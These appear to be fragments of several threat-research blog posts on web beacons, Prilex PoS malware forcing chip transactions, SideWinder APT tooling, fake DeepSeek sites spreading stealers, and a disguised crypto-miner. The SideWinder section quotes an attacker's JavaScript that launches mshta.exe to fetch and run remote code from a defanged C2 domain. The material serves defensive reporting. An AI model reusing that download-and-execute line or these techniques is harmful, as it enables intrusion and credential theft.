websites or opening e-mail messages most often.</p>\n<h3 id=\"twenty-most-common-beacons-on-websites\">Twenty most common beacons on websites</h3>\n<p>This section uses anonymous statistics collected from December 1 through 31, 2022 by the Do Not Track (DNT) component, which blocks loading of website trackers. DNT, which is disabled by default, is part of Kaspersky Internet Security, Kaspersky Total Security, and Kaspersky Security Cloud. The statistics consist of anonymized data shared by users with their consent. We have compiled a list of twenty companies whose content DNT detected around the world the most frequently. One hundred percent represents the total number of DNT detections triggered by these twenty systems.</p>\n<p>Most of the twenty companies according to DNT have at least some connection to digital advertising and marketing. For example, Aniview, in sixth place with 2.68%, specializes in video advertising. OpenX (2.19%), Taboola (1.63%), Smart AdServer (1.55%), and many others are advertising or marketing agencies.</p>\n<p>Even tech giants, such as Google (32.53%), Microsoft (21.81%), Amazon (13.15%) and Oracle (2.86%), who lead in our rankings, operate marketing and advertising subsidiaries, and product enhancement is by far not the only reason why they use web beacons.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Twenty most common website beacons in December 2022 (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03165148/01-en-web-beacon-graphs.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<h3 id=\"twenty-most-common-beacons-in-e-mail\">Twenty most common beacons in e-mail</h3>\n<p>This section presents anonymized Anti-Spam detection data from Kaspersky users&#8217; devices. The Anti-Spam component is part of Kaspersky Security for Linux Mail Server, Kaspersky Security for Microsoft Exchange Server, Kaspersky Secure Mail Gateway, and Kaspersky Security for Microsoft Office 365.</p>\n<p>Unlike the website beacons rankings, the list of the most common e-mail beacons is not dominated by the big tech: Adobe Analytics (4.49%) is eighth, and Google (3.86%) and Microsoft (3.18%) have even humbler shares. The fact that there is a fairly large number of companies specializing in e-mail marketing could explain that. These companies can be broken down into two categories:</p>\n<ul>\n<li>Email service providers (ESP): companies that manage and maintain e-mail campaigns for their clients.</li>\n<li>Customer relationship management (CRM): companies that specialize in building platforms for managing every type of customer communications at various stages in the sales process.</li>\n</ul>\n<p>The tech giants own major advertising networks that are used by most websites, and hence their trackers dominate these websites, whereas ESP and CRM companies manage most e-mail campaigns, and so their trackers dominate e-mail. ESP and CRM beacons collect user data to track their responses to e-mail campaigns: the percentage of users who open the messages, how the open rate changes from region to region, and so on. Most of the beacons we detected in e-mail traffic were by Mailchimp (21.74%) and SendGrid (19.88%), two major American e-mail marketing players.</p>\n<p>Besides ESP and CRM, our e-mail beacon rankings included the large Japanese online retailer Rakuten (5.97%), the business networking website LinkedIn (4.77%), the ride-hailing platform Uber (1.49%), and Booking.com (0.56%), a major accommodation booking service. These companies share their reasons for using web beacons with the ESP and CRM players: to evaluate e-mail campaign impact and collect aggregate user statistics.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Twenty most common web beacons in e-mail, December 2022 (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03165217/02-en-web-beacon-graphs.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Companies strive to collect as much data on their users as they can, to add as much detail to each user profile as possible, so that they can personalize their offerings, and sell their goods and services more efficiently. Various tracking systems enable companies to track users on websites, inside applications, and in e-mail.</p>\n<p>Rather than outsourcing these services, many large companies are able to set up advertising subsidiaries of their own, selling the same services as advertising specialists do. They often merge their information about users obtained from diverse sources to enrich and extend each user profile that they already have. Meanwhile, others use the services of the Internet giants, marketing agencies, ESP and CRM companies, helping these to amass even more data.</p>\n<p>The user would find it sufficiently difficult, if at all possible, to track down where their data ends up. Even more, you sometimes may not even notice that data is being collected. Beacons on websites and in e-mail are invisible to the user, and companies that put them there give no warning, as opposed to cookies. The beacons, meanwhile, allow the companies to find out how many times the users visited the website, where they came from, and who opened the e-mail, when and where. By gathering all that information on a regular basis, one can get an idea of not just the user&#8217;s reaction to specific e-mail messages or landing pages, but also the user&#8217;s habits, such as when they typically get online.</p>\n<p>If cybercriminals were to obtain that information, for example, as result of a leak, they could use it for their own purposes. In particular, they could try hacking your online accounts or send fake e-mail in your name if they found out your usual offline hours. Moreover, attackers use the web beacon technology too. It is worth adopting at least minimal anti-tracking measures to protect yourself from unwanted attention by companies, let alone cybercrooks.

Forget about those old memory scrapers seen in PoS attacks. Prilex goes beyond these, and it has evolved very differently. This is highly advanced malware adopting a unique cryptographic scheme, doing real-time patching in target software, forcing protocol downgrades, manipulating cryptograms, doing <a href=\"https://securelist.com/prilex-atm-pos-malware-evolution/107551/#from-replay-to-ghost\" rel=\"noopener\" target=\"_blank\">GHOST transactions</a> and performing credit card fraud\u2014even on cards protected with the so-called unhackable CHIP and PIN technology. And now, Prilex has gone even further.</p>\n<p>A frequent question asked about this threat was whether Prilex was able to capture data coming from NFC-enabled credit cards. During a recent Incident Response for a customer hit by Prilex, we were able to uncover <strong>three new Prilex versions capable of blocking contactless payment transactions</strong>, which became very popular in the pandemic times.</p>\n<p>This blog post covers the NFC-related capabilities of recent Prilex modifications.</p>\n<h2 id=\"tap-to-pay\">Tap-to-pay</h2>\n<p>Contactless payment systems are composed of credit and debit cards, key fobs, smart cards, or other devices, including smartphones and other mobile devices that use radio-frequency identification (RFID) or near-field communication (NFC, implemented in Samsung Pay, Apple Pay, Google Pay, Fitbit Pay, or any bank mobile application that supports contactless) for making secure payments.</p>\n<p>The embedded integrated circuit chip and antenna enable consumers to pay by waving their card, fob, or handheld device over a reader at a point-of-sale terminal. Contactless payments are made in close physical proximity, unlike other types of mobile payments that use broad-area cellular or WiFi networks and do not require close physical proximity.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/01/27083504/Prilex_blocks_NFC_01.png\"><img alt=\"Different ways of tap-to-pay, but only one technology: NFC\" class=\"aligncenter size-large wp-image-108572\" height=\"700\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/01/30172912/NFC-payments.jpg\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Different ways of tap-to-pay, but only one technology: NFC</em></strong></p>\n<p>Here is how they work:</p>\n<ul>\n<li>To make a payment with a contactless credit card, the cardholder simply holds the card close to the contactless-enabled payment terminal (usually within a few inches).</li>\n<li>The terminal sends a radio frequency (RF) signal to the card, activating the RFID chip embedded in the card.</li>\n<li>The RFID chip in the card sends a unique identification number (ID) and transaction information to the terminal. The transaction data is non-reusable, so even if it is stolen by cybercriminals, they cannot steal the money by using that. Neither can they access the RFID chip to tamper with the data generation processes.</li>\n<li>The terminal sends the transaction information to the card issuer&#8217;s processing network for authorization.</li>\n<li>If the transaction is approved, the terminal usually displays a confirmation message, and the payment is processed.</li>\n</ul>\n<h2 id=\"the-pandemic-gave-a-boost-to-nfc-payments\">The pandemic gave a boost to NFC payments</h2>\n<p>The size of the global market for contactless payments was estimated at $34.55 billion in 2021 and is expected to continue growing at a compound rate of 19.1% from 2022 to 2030 annually, according to <a href=\"https://www.grandviewresearch.com/industry-analysis/contactless-payments-market\" rel=\"noopener\" target=\"_blank\">GrandView Research</a>. The market was dominated by the retail segment, which accounted for more than 59.0% of global contactless revenue in 2021. Recent years saw an increase in the number of retail tap-and-go transactions: retailers can clearly see the benefits of contactless payments, which reduce transaction time, increase revenue, and improve operational efficiency. As stated in a Mastercard global study covering the year 2020, 74.0% of retailers expressed the intention to continue using contactless payments beyond the pandemic.</p>\n<p>According to the <a href=\"https://www.uspaymentsforum.org/us-payments-forum-fall-market-snapshot-next-steps-for-contactless-fraud-in-focus-alternative-payment-boom/\" rel=\"noopener\" target=\"_blank\">US Payments Forum</a>, Visa reports that in the U.S., tap-to-pay accounts for 28% of all face-to-face transactions, five times the pre-pandemic levels, while Mastercard says that 82% of card-present transactions in the country are happening at contactless-enabled locations. In Australia, contactless payments were growing in popularity even before the pandemic, with four out of five point-of-sale purchases <a href=\"https://www.rba.gov.au/snapshots/how-australians-pay-snapshot/\" rel=\"noopener\" target=\"_blank\">being contactless</a> in 2019. In the coming years, the popularity of this payment method is <a href=\"https://www.statista.com/statistics/1227815/contactless-payments-worldwide-by-region/\" rel=\"noopener\" target=\"_blank\">expected to grow</a> even more everywhere in the world.</p>\n<p>Contactless credit cards offer a convenient and secure way to make payments without the need to physically insert or swipe the card. <strong>But what happens if a threat can disable these payments in the <a href=\"https://en.wikipedia.org/wiki/Electronic_funds_transfer\" rel=\"noopener\" target=\"_blank\">EFT software</a> running in the computer and force you to insert the card in the PINpad reader?</strong></p>\n<h2 id=\"insert-to-get-robbed\">Insert-to-get-robbed</h2>\n<p>We have observed three new Prilex versions in the wild and managed to obtain the latest one (version 06.03.8080). The two others are 06.03.8070 and 06.03.8072.</p>\n<p>The obtained version was discovered as<strong> recently as November 2022</strong> and appears to originate from a different codebase than the others we found at the beginning of that year. <strong>Prilex now implements a rule-based file that specifies whether or not to capture credit card information and an option to block NFC-based transactions.</strong></p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/01/27083555/Prilex_blocks_NFC_02.png\"><img alt=\"Excerpt from a Prilex rules file referencing NFC blocking\" class=\"aligncenter size-large wp-image-108573\" height=\"125\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/01/27083555/Prilex_blocks_NFC_02-1024x125.png\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Excerpt from a Prilex rules file referencing NFC blocking</em></strong></p>\n<p>This is due to the fact that NFC-based transactions often generate a unique ID or card number valid for only one transaction. If Prilex detects an NFC-based transaction and blocks it, the EFT software will program the PIN pad to show the following message:</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/01132707/prilex-error-message.jpeg\"><img class=\"aligncenter size-full wp-image-108574\" height=\"663\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/01132707/prilex-error-message.jpeg\" width=\"369\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Prilex fake error displayed on the PIN pad reader that says, &#8220;Contactless error, insert your card&#8221;</em></strong></p>\n<p>Of course, the goal here is to force the victim to use their physical card by inserting it into the PIN pad reader, so the malware will be able to capture the data coming from the transaction by using all the techniques <a href=\"https://securelist.com/prilex-atm-pos-malware-evolution/107551/\" rel=\"noopener\" target=\"_blank\">described in our previous publication</a>, such as manipulating cryptograms and performing a GHOST attack. Another interesting new feature added in the latest Prilex samples is the possibility to filter credit cards according to segment and create different rules for each segment. For example, these rules can block NFC and capture card data only if the card is a Black/Infinite, Corporate or another tier with a high transaction limit, which is much more attractive than standard credit cards with a low balance/limit.</p>\n<h2 id=\"malware-adapting-to-the-latest-trends\">Malware adapting to the latest trends</h2>\n<p>With contactless cards growing in numbers and adoption increasing all over the world, the number of payments using this method has increased significantly and is expected to grow further in the years to come. Since transaction data generated during a contactless payment are useless from a cybercriminal&#8217;s perspective, it is understandable that Prilex needs to force victims to insert the card into the infected PoS terminal. While the group is looking for a way to commit fraud with unique credit card numbers, this clever trick allows it to continue operating.</p>\n<p>The Prilex family is detected by all Kaspersky products as <strong>HEUR:Trojan.Win32.Prilex</strong> and <strong>HEUR:Trojan.Win64.Prilex</strong>.

In it, we described activities that had mostly happened in the first half of the year. We tried to draw attention to the group, which was aggressively extending its activities beyond their typical targets, infecting government entities, logistics companies and maritime infrastructures in South and Southeast Asia, the Middle East, and Africa. We also shared further information about SideWinder&#8217;s post-exploitation activities and described a new sophisticated implant designed specifically for espionage.</p>\n<p>We continued to monitor the group throughout the rest of the year, observing intense activity that included updates to SideWinder&#8217;s toolset and the creation of a massive new infrastructure to spread malware and control compromised systems. The targeted sectors were consistent with those we had seen in the first part of 2024, but we noticed a new and significant increase in attacks against maritime infrastructures and logistics companies.</p>\n<p>In 2024, we initially observed a significant number of attacks in Djibouti. Subsequently, the attackers shifted their focus to other entities in Asia and showed a strong interest in targets within Egypt.</p>\n<p>Moreover, we observed other attacks that indicated a specific interest in nuclear power plants and nuclear energy in South Asia and further expansion of activities into new countries, especially in Africa.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115868\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082407/SideWinder-graphics_1.png\"><img alt=\"Countries and territories targeted by SideWinder in the maritime and logistics sectors in 2024\" class=\"size-large wp-image-115868\" height=\"635\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082407/SideWinder-graphics_1-1024x635.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115868\">Countries and territories targeted by SideWinder in the maritime and logistics sectors in 2024</p></div>\n<p>It is worth noting that SideWinder constantly works to improve its toolsets, stay ahead of security software detections, extend persistence on compromised networks, and hide its presence on infected systems. Based on our observation of the group&#8217;s activities, we presume they are constantly monitoring detections of their toolset by security solutions. Once their tools are identified, they respond by generating a new and modified version of the malware, often in under five hours. If behavioral detections occur, SideWinder tries to change the techniques used to maintain persistence and load components. Additionally, they change the names and paths of their malicious files. Thus, monitoring and detection of the group&#8217;s activities reminds us of a ping-pong game.</p>\n<h2 id=\"infection-vectors\">Infection vectors</h2>\n<p>The infection pattern observed in the second part of 2024 is consistent with the one described in the previous article.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115854\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07150955/SideWinder_02.png\"><img alt=\"Infection flow\" class=\"size-large wp-image-115854\" height=\"581\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07150955/SideWinder_02-1024x581.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115854\">Infection flow</p></div>\n<p>The attacker sends spear-phishing emails with a DOCX file attached.

For example, we found a document with information on renting a car in Bulgaria, a document expressing an intent to buy a garage, and another document offering a freelance video game developer a job working on a 3D action-adventure game called &#8220;Galactic Odyssey&#8221;.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115857\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07153026/SideWinder_05.png\"><img alt=\"Examples of generic malicious documents\" class=\"size-large wp-image-115857\" height=\"284\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/07153026/SideWinder_05-1024x284.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115857\">Examples of generic malicious documents</p></div>\n<h2 id=\"rtf-exploit\">RTF exploit</h2>\n<p>The exploit file contained a shellcode, which had been updated by the attacker since our previous research, but the main goal remained the same: to run embedded JavaScript code invoking the <pre class=\"crayon-plain-tag\">mshtml.RunHTMLApplication</pre> function.</p>\n<p>In the new version, the embedded JavaScript runs the Windows utility <pre class=\"crayon-plain-tag\">mshta.exe</pre> and obtains additional code from a remote server:</p><pre class=\"crayon-plain-tag\">javascript:eval(\"var gShZVnyR = new ActiveXObject('WScript.Shell');gShZVnyR.Run('mshta.exe\nhttps://dgtk.depo-govpk[.]com/19263687/trui',0);window.close();\")</pre><p>\nThe newer version of the shellcode still uses certain tricks to avoid sandboxes and complicate analysis, although they differ slightly from those in past versions.</p>\n<ul>\n<li>It uses the <pre class=\"crayon-plain-tag\">GlobalMemoryStatusEx</pre> function to determine the size of RAM.</li>\n<li>It attempts to load the <pre class=\"crayon-plain-tag\">nlssorting.dll</pre> library and terminates execution if operation succeeds.</li>\n</ul>\n<h2 id=\"javascript-loader\">JavaScript loader</h2>\n<p>The RTF exploit led to the execution of the <pre class=\"crayon-plain-tag\">mshta.exe</pre> Windows utility, abused to download a malicious HTA from a remote server controlled by the attacker.</p><pre class=\"crayon-plain-tag\">mshta.exe hxxps://dgtk.depo-govpk[.]com/19263687/trui</pre><p>\nThe remote HTA embeds a heavily obfuscated JavaScript file that loads further malware, the &#8220;Downloader Module&#8221;, into memory.</p>\n<p>The JavaScript loader operates in two stages. The first stage begins execution by loading various strings, initially encoded with a substitution algorithm and stored as variables. It then checks the installed RAM and terminates if the total size is less than 950 MB. Otherwise, the previously decoded strings are used to load the second stage.</p>\n<p>The second stage is another JavaScript file. It enumerates the subfolders at Windows%\\Microsoft.NET\\Framework\\ to find the version of the .NET framework installed on the system and uses the resulting value to configure the environment variable <pre class=\"crayon-plain-tag\">COMPLUS_Version</pre>.</p>\n<p>Finally, the second stage decodes and loads the Downloader Module, which is embedded within its code as a base64-encoded .NET serialized stream.</p>\n<h2 id=\"downloader-module\">Downloader Module</h2>\n<p>This component is a .NET library used to collect information about the installed security solution and download another component, the &#8220;Module Installer&#8221;. These components were already described in the <a href=\"https://securelist.com/sidewinder-apt/114089/\" rel=\"noopener\" target=\"_blank\">previous article</a> and will not be detailed again here.</p>\n<p>In our latest investigation, we discovered a new version of the <pre class=\"crayon-plain-tag\">app.dll</pre> Downloader Module, which includes a more sophisticated function for identifying installed security solutions.</p>\n<p>In the previous version, the malware used a simple WMI query to obtain a list of installed products. The new version uses a different WMI, which collects the name of the antivirus and the related &#8220;productState&#8221;.</p>\n<p>Furthermore, the malware compares all running process names against an embedded dictionary. The dictionary contains 137 unique process names associated with popular security solutions.<br />\nThe WMI query is executed only when no Kaspersky processes are running on the system.</p>\n<h2 id=\"backdoor-loader\">Backdoor Loader</h2>\n<p>The infection chain concludes with the installation of malware that we have named &#8220;Backdoor Loader&#8221;, a library consistently sideloaded using a legitimate and signed application. Its primary function is to load the &#8220;StealerBot&#8221; implant into memory. Both the &#8220;Backdoor Loader&#8221; and &#8220;StealerBot&#8221; were thoroughly described in our prior article, but the attacker has distributed numerous variants of the loader in recent months, whereas the implant has remained unchanged.</p>\n<p>In the previous campaign, the &#8220;Backdoor Loader&#8221; library was designed to be loaded by two specific programs. For correct execution, it had to be stored on victims&#8217; systems under one of the following names:</p><pre class=\"crayon-plain-tag\">propsys.dll\nvsstrace.dll</pre><p>\nDuring the most recent campaign, the attackers tried to diversify the samples, generating many other variants distributed under the following names:</p><pre class=\"crayon-plain-tag\">JetCfg.dll\npolicymanager.dll\nwinmm.dll\nxmllite.dll\ndcntel.dll\nUxTheme.dll</pre><p>\nThe new malware variants feature an enhanced version of anti-analysis code and employ Control Flow Flattening more extensively to evade detection.</p>\n<p>During the investigation, we found a new C++ version of the &#8220;Backdoor Loader&#8221; component. The malware logic is the same as that used in the .NET variants, but the C++ version differs from the .NET implants in that it lacks anti-analysis techniques. Furthermore, most of the samples were tailored to specific targets, as they were configured to load the second stage from a specific file path embedded in the code, which also included the user&#8217;s name. Example:</p><pre class=\"crayon-plain-tag\">C:\\Users\\[REDACTED]\\AppData\\Roaming\\valgrind\\[REDACTED FILE NAME].[REDACTED EXTENSION]</pre><p>\nIt indicates that these variants were likely used after the infection phase and manually deployed by the attacker within the already compromised infrastructure, after validating the victim.</p>\n<h2 id=\"victims\">Victims</h2>\n<p>SideWinder continues to attack its usual targets, especially government, military, and diplomatic entities. The targeted sectors are consistent with those observed in the past, but it is worth mentioning that the number of attacks against the maritime and the logistics sectors has increased and expanded to Southeast Asia.</p>\n<p>Furthermore, we observed attacks against entities associated with nuclear energy. The following industries were also affected: telecommunication, consulting, IT service companies, real estate agencies, and hotels.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115869\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082420/SideWinder-graphics_2.png\"><img alt=\"Countries and territories targeted by SideWinder in 2024\" class=\"size-large wp-image-115869\" height=\"961\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10082420/SideWinder-graphics_2-1024x961.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115869\">Countries and territories targeted by SideWinder in 2024</p></div>\n<p>Overall, the group has further extended its activities, especially in Africa. We detected attacks in Austria, Bangladesh, Cambodia, Djibouti, Egypt, Indonesia, Mozambique, Myanmar, Nepal, Pakistan, Philippines, Sri Lanka, the United Arab Emirates, and Vietnam.</p>\n<p>In this latest wave of attacks, SideWinder also targeted diplomatic entities in Afghanistan, Algeria, Bulgaria, China, India, the Maldives, Rwanda, Saudi Arabia, Turkey, and Uganda.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>SideWinder is a very active and persistent actor that is constantly evolving and improving its toolkits. Its basic infection method is the use of an old Microsoft Office vulnerability, <a href=\"https://www.kaspersky.com/blog/cve-2017-11882-exploitation-on-the-rise/48768/\" rel=\"noopener\" target=\"_blank\">CVE-2017-11882</a>, which once again emphasizes the critical importance of installing security patches.</p>\n<p>Despite the use of an old exploit, we should not underestimate this threat actor. In fact, SideWinder has already demonstrated its ability to compromise critical assets and high-profile entities, including those in the military and government. We know the group&#8217;s software development capabilities, which became evident when we observed how quickly they could deliver updated versions of their tools to evade detection, often within hours. Furthermore, we know that their toolset also includes advanced malware, like the sophisticated in-memory implant &#8220;StealerBot&#8221; described in our previous article. These capabilities make them a highly advanced and dangerous adversary.</p>\n<p>To protect against such attacks, we strongly recommend maintaining a patch management process to apply security fixes (you can use solutions like <a href=\"https://www.kaspersky.com/small-to-medium-business-security/systems-management?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team___ksysm____49792969949dc2ac\" rel=\"noopener\" target=\"_blank\">Vulnerability Assessment and Patch Management</a> and <a href=\"https://www.kaspersky.com/vuln-feed?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______371398534a23cb78\" rel=\"noopener\" target=\"_blank\">Kaspersky Vulnerability Data Feed</a>) and using a comprehensive security solution that provides incident detection and response, as well as threat hunting. <a href=\"https://www.kaspersky.com/enterprise-security/xdr?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team___xdr____33801aaaec3e63b3\" rel=\"noopener\" target=\"_blank\">Our product line for businesses</a> helps identify and prevent attacks of any complexity at an early stage.

It&#8217;s available both for local use and as a free service. Since DeepSeek was the first service to offer access to a reasoning LLM to a wide audience, it quickly gained popularity, mirroring the success of ChatGPT. Naturally, this surge in interest also attracted cybercriminals.</p>\n<p>While analyzing our internal threat intelligence data, we discovered several groups of websites mimicking the official DeepSeek chatbot site and distributing malicious code disguised as a client for the popular service.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115816\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05145826/DeepSeek_malware_01.png\"><img alt=\"Screenshot of the official DeepSeek website (February 2025)\" class=\"size-large wp-image-115816\" height=\"495\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05145826/DeepSeek_malware_01-1024x495.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115816\">Screenshot of the official DeepSeek website (February 2025)</p></div>\n<h2 id=\"scheme-1-python-stealer-and-non-existent-deepseek-client\">Scheme 1: Python stealer and non-existent DeepSeek client</h2>\n<p>The first group of websites was hosted on domains whose names included DeepSeek model versions (V3 and R1):</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">r1-deepseek[.]net</pre>;</li>\n<li><pre class=\"crayon-plain-tag\">v3-deepseek[.]com</pre>.</li>\n</ul>\n<p>As shown in the screenshot, the fake website lacks the option to start a chat \u2013 you can only download an application.

This is a stealer script written in Python that we haven&#8217;t seen in attacks before. If it&#8217;s executed successfully, the attackers obtain a wealth of data from the victim&#8217;s computer: cookies and session tokens from various browsers, login credentials for email, gaming, and other accounts, files with certain extensions, cryptocurrency wallet information, and more.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153222/DeepSeek_malware_07.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115822\" height=\"449\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153222/DeepSeek_malware_07-1024x449.png\" width=\"1024\" /></a></p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153255/DeepSeek_malware_08.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115823\" height=\"784\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153255/DeepSeek_malware_08-1024x784.png\" width=\"1024\" /></a></p>\n<p>After collecting the necessary data, the script generates an archive and then either sends it to the stealer&#8217;s operators using a Telegram bot or uploads it to the Gofile file-sharing service. Thus, attempting to use the chatbot could result in the victim losing social media access, personal data, and even cryptocurrency. If corporate credentials are stored on the compromised device, entire organizations could also be at risk, leading to far more severe consequences.</p>\n<h2 id=\"scheme-2-malicious-script-and-a-million-views\">Scheme 2: Malicious script and a million views</h2>\n<p>In another case, fake DeepSeek websites were found on the following domains:</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">deepseek-pc-ai[.]com</pre></li>\n<li><pre class=\"crayon-plain-tag\">deepseek-ai-soft[.]com</pre></li>\n</ul>\n<p>We discovered the first domain back in early February, hosting the default Apache web server page with no content. Later, this domain displayed a new web page closely resembling the DeepSeek website. Notably, the fake site uses <a href=\"https://encyclopedia.kaspersky.com/glossary/geofencing/\" rel=\"noopener\" target=\"_blank\">geofencing</a>: when requests come from certain IP addresses, such as Russian ones, it returns a placeholder page filled with generic SEO text about DeepSeek (we believe this text may have been <a href=\"https://securelist.com/llm-phish-blunders/114367/\" rel=\"noopener\" target=\"_blank\">LLM-generated</a>):</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153419/DeepSeek_malware_09.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115824\" height=\"495\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153419/DeepSeek_malware_09-1024x495.png\" width=\"1024\" /></a></p>\n<p>If the IP address and other request parameters meet the specified criteria, the server returns a page resembling DeepSeek. Users are prompted to download a client or start the chatbot, but either action results in downloading a malicious installer created using <a href=\"https://en.wikipedia.org/wiki/Inno_Setup\" rel=\"noopener\" target=\"_blank\">Inno Setup</a>. Kaspersky products detect it as <pre class=\"crayon-plain-tag\">Trojan-Downloader.Win32.TookPS.*</pre>.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06075655/7.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115843\" height=\"431\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06075655/7-1024x431.png\" width=\"1024\" /></a></p>\n<p>When executed, this installer contacts malicious URLs to receive a command that will be executed using cmd. The most common command launches <pre class=\"crayon-plain-tag\">powershell.exe</pre> with a Base64-encoded script as an argument. This script accesses an encoded URL to download another PowerShell script, which activates the built-in SSH service and modifies its configuration using the attacker&#8217;s keys, allowing remote access to the victim&#8217;s computer.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115826\" style=\"width: 867px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153658/DeepSeek_malware_11.png\"><img alt=\"Part of the malicious PowerShell script\" class=\"size-full wp-image-115826\" height=\"877\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153658/DeepSeek_malware_11.png\" width=\"857\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115826\">Part of the malicious PowerShell script</p></div>\n<p>This case is notable because we managed to identify the primary vector for spreading the malicious links \u2013 posts on the social network X (formerly Twitter):</p>\n<p align=\"center\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072310/6-1.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-115837\" height=\"699\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072310/6-1.png\" width=\"585\" /></a></p>\n<p>This post, directing users to <pre class=\"crayon-plain-tag\">deepseek-pc-ai[.]com</pre>, was made from an account belonging to an Australian company.

Typically, links to such sites are distributed through messengers and social networks, as seen in the example with the X post.

This technology is used in various utilities, including ones for bypassing blocks and restrictions of access to resources worldwide.

This plays into the hands of attackers by allowing them to persist in an unprotected system without the risk of detection. Most active of all have been schemes for distributing popular stealers, remote access tools (RATs), Trojans that provide hidden remote access, and miners that harness computing power to mine cryptocurrency. The most commonly used malware families were NJRat, XWorm, Phemedrone and DCRat.</p>\n<h2 id=\"blackmail-as-a-new-infection-scheme\">Blackmail as a new infection scheme</h2>\n<p>We recently uncovered a mass malware campaign infecting users with a miner disguised as a tool for bypassing blocks based on deep packet inspection (DPI). The original version of the tool is published on GitHub, where it has been starred more than 10,000 times. There is also a separate project based on it that is used to access Discord and YouTube.</p>\n<p>According to our telemetry, the malware campaign has affected <strong>more than 2,000 victims in Russia</strong>, but the overall figure could be much higher. One of the infection channels was a YouTuber with 60,000 subscribers, who posted several videos with instructions for bypassing blocks, adding a link to a malicious archive in the description. These videos have reached more than 400,000 views. The description was later edited and the link replaced with the message <em>&#8220;program does not work&#8221;</em>.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110103/SilentCryptoMiner_03.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115792\" height=\"284\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110103/SilentCryptoMiner_03-1024x284.png\" width=\"1024\" /></a></p>\n<p>The link pointed to the malicious site <pre class=\"crayon-plain-tag\">gitrok[.]com</pre>, which hosted the infected archive.

